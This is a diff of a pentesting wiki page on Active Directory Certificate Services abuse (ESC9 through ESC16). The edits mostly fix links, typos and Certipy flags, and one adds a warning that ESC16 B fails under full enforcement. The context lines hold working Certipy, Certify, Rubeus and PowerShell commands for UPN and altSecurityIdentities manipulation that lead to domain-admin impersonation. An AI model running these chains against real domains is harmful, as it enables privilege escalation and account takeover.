@@ -65,7 +65,7 @@ Some flags prevent default users/computers from enrolling in a given certificate
 
 As explained before, _weak_ and _strong_ "labels" are applied to certificate mapping and will influence on the final behavior of explicit and implicit mappings during Kebreros and Schannel authentications.
 
-Following [CVE-2022–26923](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) ([certifried.md](https://www.thehacker.recipes/ad/movement/adcs/certifried)) discovered by [Olivier Lyak](https://twitter.com/ly4k_), Microsoft has implemented a new security extension for the issued certificates, and two new registry keys to properly deal with certificate mapping.
+Following [CVE-2022–26923](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) ([certifried.md](/ad/movement/ad-cs/certifried)) discovered by [Olivier Lyak](https://twitter.com/ly4k_), Microsoft has implemented a new security extension for the issued certificates, and two new registry keys to properly deal with certificate mapping.
 
 * The `szOID_NTDS_CA_SECURITY_EXT` extension contains the `objectSid` of the requester and is used during implicit strong mapping
 * The `StrongCertificateBindingEnforcement` registry key is used for Kerberos mapping
@@ -89,7 +89,7 @@ If the registry key value is `0` and the certificate contains an DNS value (norm
 
 If the registry key value is `1` or `2`, and no explicit mapping is in place, the `szOID_NTDS_CA_SECURITY_EXT` security extension will be used to implicitly map the account using its `objectSid`. If the registry key is set to `1` and no security extension is present, the mapping behaviour is similar to that of a registry key set to `0`.
 
-To support compatibility mode, Microsoft has introduced the `CT_FLAG_NO_SECURITY_EXTENSION` flag for the `msPKI-Enrollment-Flag` attribute of certificate templates. If present, the CA will not include the user's SID when issuing certificates (see [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#no-security-extension-esc9)).
+To support compatibility mode, Microsoft has introduced the `CT_FLAG_NO_SECURITY_EXTENSION` flag for the `msPKI-Enrollment-Flag` attribute of certificate templates. If present, the CA will not include the user's SID when issuing certificates (see [ESC9](/ad/movement/ad-cs/certificate-templates#no-security-extension-esc9)).
 
 As indicated by Jonas Bülow Knudsen [in his article](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9), observations can be done regarding Kerberos authentication:
 
@@ -103,7 +103,7 @@ It is worth noting that registry parameters only apply on the host on which they
 
 Schannel authentication
 
-During Kerberos authentication, the certificate mapping process will call the `CertificateMappingMethods` registry key. This key can be a combinaison of the following values:
+During Schannel authentication, the certificate mapping process will call the `CertificateMappingMethods` registry key. This key can be a combination of the following values:
 
 * `0x0001`: subject/issuer explicit mapping
 * `0x0002`: issuer explicit mapping
@@ -164,7 +164,7 @@ By default, Certipy uses LDAPS, which is not always supported by the domain cont
 
 <Callout type="info">
 
-If you get an "Object SID mismatch" error during the authentication, this could mean that Kerberos is enforcing [strong certificate mapping](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#weak-and-strong-mapping). This is the default behavior since february 2025 ([more information](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16#bkmk_certmap)). It is then possible to specify the security identifier (using the certipy's flag `-sid`) corresponding at the specified `subjectAltName`.
+If you get an "Object SID mismatch" error during the authentication, this could mean that Kerberos is enforcing [strong certificate mapping](/ad/movement/ad-cs/certificate-templates#weak-and-strong-mapping). This is the default behavior since february 2025 ([more information](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16#bkmk_certmap)). It is then possible to specify the security identifier (using the certipy's flag `-sid`) corresponding at the specified `subjectAltName`.
 
 </Callout>
 
@@ -298,7 +298,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 The vulnerable certificate can be requested as **user2**.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
 ```
 
 The **user2**'s UPN is changed back to something else.
@@ -408,7 +408,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as **user2**.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The **user2**'s UPN is changed back to something else.
@@ -512,7 +512,7 @@ certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn
 A certificate permitting client authentication can be requested as **user2**.
 
 ```bash
-certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hashes "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The **user2**'s UPN is changed back to something else.
@@ -601,7 +601,7 @@ To exploit ESC13, here are the requirements:
 From UNIX-like systems, this [pull request](https://github.com/ly4k/Certipy/pull/196) on Certipy (Python) permits to identify a certificate template with an issuance policy, i.e. with the `msPKI-Certificate-Policy` property not empty. Additionally, it verifies if this issuance policy has an OID group link to a group in the property `msDS-OIDToGroupLink`.
 
 ```bash
-certipy find -u '$USER@$DOMAIN' -p '"$PASSWORD' -dc-ip '$DC_IP'
+certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP"
 ```
 
 If a vulnerable template is found, there is no particular issuance requirement, the principal can enroll, and the template indicates the Client Authentication EKU, request a certificate for this template with [Certipy](https://github.com/ly4k/Certipy) (Python) as usual:
@@ -641,7 +641,7 @@ The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerber
 
 ### Weak explicit mapping (ESC14)  <a href="#esc14-weak-explicit-mapping" id="esc14-weak-explicit-mapping"></a>
 
-This attack exploits configuration errors when explicit mapping is set up. To understand this ESC, it is essential to have a good command of [Certificate mapping](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-mapping).
+This attack exploits configuration errors when explicit mapping is set up. To understand this ESC, it is essential to have a good command of [Certificate mapping](/ad/movement/ad-cs/certificate-templates#certificate-mapping).
 
 There are four possible attack scenarios for exploiting ESC14. In all cases, the following prerequisites must be met:
 
@@ -724,7 +724,7 @@ Get-AltSecIDMapping -SearchBase "CN=Users,DC=domain,DC=local"
 
 The attacker has write access to the `altSecurityIdentities` attribute of the target. He can enrol on a certificate as the victim and create an explicit mapping for the target by modifying its `altSecurityIdentities` attribute and pointing it to the obtained certificate. The certificate can then be used to authenticate as the target.
 
-Write rights to `altSecurityIdentities` can be obtained via the following [DACL](https://www.thehacker.recipes/ad/movement/dacl/):
+Write rights to `altSecurityIdentities` can be obtained via the following [DACL](/ad/movement/dacl):
 
 * Write property `altSecurityIdentities`
 * Write property `Public-Information`
@@ -743,7 +743,7 @@ For PKINIT authentication, no additional requirements are necessary. For Schanne
 From UNIX-like systems, with [certipy](https://github.com/ly4k/Certipy), it is possible to enroll on a certificate template.
 
 ```bash
-certipy req -u $TARGET@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
+certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
 Then, using [certipy](https://github.com/ly4k/Certipy), we can get the certificate out of the pfx file.
@@ -793,7 +793,7 @@ conn.modify(
 conn.unbind()
 ```
 
-The certificate requested at the begining can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate requested at the begining can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 The certificate mapping written can be cleaned with the following python script.
 
@@ -851,7 +851,7 @@ Add-AltSecIDMapping -DistinguishedName $TARGET_DN -MappingString $MAPPING_STRING
 Get-AltSecIDMapping -DistinguishedName $TARGET_DN
 ```
 
-The certificate requested at the begining can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate requested at the begining can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 The certificate mapping written can be cleaned with [Remove-AltSecIDMapping](https://github.com/JonasBK/Powershell/blob/master/Remove-AltSecIDMapping.ps1) (PowerShell).
 
@@ -914,7 +914,7 @@ With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll o
 certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 </Tab>
 
@@ -998,7 +998,7 @@ With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll o
 certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 </Tab>
 
@@ -1081,13 +1081,13 @@ With [certipy](https://github.com/ly4k/Certipy), it is then possible to enroll o
 certipy req -u $VICTIM@$DOMAIN -ca $CA_NAME -template $TEMPLATE -dc-ip $DC_IP
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 </Tab>
 
 <Tab value="Windows">
 
-From Windows systems, with PowerShell the `cn` attribute of the victim must be overwritten to be equal to `$TARGET.domain.local`.
+From Windows systems, with PowerShell the `dNSHostName` attribute of the victim must be overwritten to be equal to the target's (`$TARGET`).
 
 ```powershell
 $victim = [ADSI]"LDAP://CN=$VICTIM,CN=Computers,DC=domain,DC=local"
@@ -1166,7 +1166,7 @@ There are two possible attack scenarios for exploiting ESC16. In all cases, **on
 
 #### **Compatibility mode (ESC16 A)**
 
-In this scenario, the attacker has `GenericWrite` permission over a victim account, which can be used to overwrite the victim's UPN. Using the victim's NT hash obtained via a [Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials.md#shadow-credentials) attack, it's possible to request a certificate from the CA on the victim's behalf. Thanks to the UPN manipulation, a valid certificate can be obtained for any user in the domain.
+In this scenario, the attacker has `GenericWrite` permission over a victim account, which can be used to overwrite the victim's UPN. Using the victim's NT hash obtained via a [Shadow Credentials](/ad/movement/kerberos/shadow-credentials) attack, it's possible to request a certificate from the CA on the victim's behalf. Thanks to the UPN manipulation, a valid certificate can be obtained for any user in the domain.
 
 To conduct this scenario, the following additional prerequisites must be met:
 
@@ -1233,7 +1233,7 @@ certipy auth \
     -username 'administrator' -domain "$DOMAIN"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 </Tab>
 
@@ -1269,12 +1269,19 @@ Set-DomainObject victim -Set @{'userPrincipalName'='victim@corp.local'} -Verbose
 Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 </Tab>
 </Tabs>
 
 #### **Full enforcement (ESC16 B)**
+
+<Callout type="warn">
+
+**This chain is not exploitable under full enforcement (`StrongCertificateBindingEnforcement = 2`).** Per SpecterOps, under full enforcement the KDC requires a valid `szOID_NTDS_CA_SECURITY_EXT` SID extension matching the impersonated principal. A CA vulnerable to ESC16 globally disables that extension, so no valid SID can be embedded in issued certificates and the KDC rejects authentication. The ESC16 + ESC6 combination below only bypasses compatibility mode (`0` or `1`), not full enforcement.
+
+</Callout>
+
 
 In this scenario, the DC's `StrongCertificateBindingEnforcement` attribute is set to `2`, meaning the KDC will verify the SID present in the certificate's security extension. If the CA is vulnerable to ESC6, the SID can be manipulated directly in the SAN field of the certificate request, bypassing the enforcement policy.
 
@@ -1283,7 +1290,7 @@ To conduct this scenario, the following additional prerequisites must be met:
 <Callout type="warn">
 
 * For PKINIT, `StrongCertificateBindingEnforcement` is set to `2`
-* CA vulnerable to [ESC6](https://www.thehacker.recipes/ad/movement/adcs/certificate-authority#esc6-editf_attributesubjectaltname2)
+* CA vulnerable to [ESC6](/ad/movement/ad-cs/certificate-authority#esc6-editf-attributesubjectaltname2)
 
 </Callout>
 
@@ -1298,7 +1305,7 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used t
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$TARGET" -ca "$CA" -template "User" -upn "administrator@$DOMAIN" -sid "$ADMIN_SID"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 <Callout type="info">
 
@@ -1316,7 +1323,7 @@ From Windows, [Certify](https://github.com/GhostPack/Certify) can be used to req
 ./Certify.exe request /ca:SERVER\CA /template:User /altname:administrator /url:tag:microsoft.com,2007-09-14:sid:<ADMINISTRATOR_SID>
 ```
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate as the target.
 
 <Callout type="info">
 
